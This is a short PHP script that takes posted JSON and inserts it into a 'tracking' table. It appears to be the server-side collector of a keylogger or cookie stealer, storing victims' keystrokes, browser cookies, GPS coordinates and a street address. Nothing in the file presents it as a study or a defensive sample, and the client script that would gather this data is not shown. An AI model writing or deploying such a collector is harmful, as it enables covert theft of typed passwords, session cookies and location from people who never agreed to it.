<?php
    // Gets the data and inserts it into the db
    if(isset($_POST["data"])){
        $db = new mysqli("","","",""); /* Your db here */
        $parsed = json_decode($_POST["data"]);

        $sql = "INSERT INTO tracking (address, `keys`, `time`, cookies, latitude, longitude, real_address) VALUES (?, ?, ?, ?, ?, ?, ?);";

        $address =          isset($parsed->address) ? $parsed->address : null;
        $keys =             isset($parsed->keys) ? $parsed->keys : null;
        $time =             isset($parsed->time) ? $parsed->time : null;
        $cookies =          isset($parsed->cookies) ? $parsed->cookies : null;
        $latitude =         isset($parsed->latitude) ? $parsed->latitude : null;
        $longitude =        isset($parsed->longitude) ? $parsed->longitude : null;
        $real_address =     isset($parsed->real_address) ? $parsed->real_address : null;

        $stmt = $db->prepare($sql);
        $stmt->bind_param('sssssss', $address, $keys, $time, $cookies, $latitude, $longitude, $real_address);
        $stmt->execute();

        $stmt->close();
    }
?>
